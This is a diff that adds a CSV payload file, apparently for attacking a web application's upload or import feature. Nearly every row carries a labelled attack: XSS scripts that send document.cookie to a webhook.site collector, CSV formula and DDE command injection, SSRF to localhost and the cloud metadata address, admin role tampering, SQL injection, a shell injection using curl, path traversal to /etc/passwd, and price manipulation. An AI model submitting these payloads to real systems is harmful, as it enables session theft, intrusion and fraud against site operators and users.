@@ -1,0 +1,14 @@
+name,email,url,comment,callback_url,role,user_id,price,file_path
+Normal User,user@example.com,http://example.com,Hello world,https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8,user,1001,10,/uploads/file.csv
+XSS Test,xss@test.com,https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8,<script>fetch('https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8?xss='+document.cookie)</script>,https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8,user,1002,10,/uploads/xss.csv
+IMG XSS,img@test.com,https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8,"""'><img src=x onerror=fetch('https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8?img='+document.cookie)>",https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8,user,1003,10,/uploads/xss2.csv
+CSV Injection,csv@test.com,https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8,"=HYPERLINK(""https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8"")",https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8,user,1004,10,/uploads/csv.csv
+CMD Injection,cmd@test.com,https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8,=cmd|' /C calc'!A0,https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8,user,1005,10,/uploads/cmd.csv
+SSRF Local,ssrf@test.com,http://127.0.0.1,test,https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8,user,1006,10,/uploads/ssrf.csv
+SSRF Metadata,ssrf2@test.com,http://169.254.169.254/latest/meta-data/,test,https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8,user,1007,10,/uploads/ssrf2.csv
+Admin Inject,admin@test.com,https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8,test,https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8,admin,1,100000,/uploads/admin.csv
+SQLi Test,sqli@test.com,https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8,' OR 1=1--,https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8,user,1008,10,/uploads/sqli.csv
+CMD Test,cmd2@test.com,https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8,test;curl https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8,https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8,user,1009,10,/uploads/cmd2.csv
+Traversal,path@test.com,https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8,test,https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8,user,1010,10,../../../../etc/passwd
+Free Product,free@test.com,https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8,test,https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8,user,1011,0,/uploads/free.csv
+Negative Quantity,neg@test.com,https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8,test,https://webhook.site/94c46103-dc88-46cb-8dba-3c9c77d359e8,user,1012,-10,/uploads/neg.csv
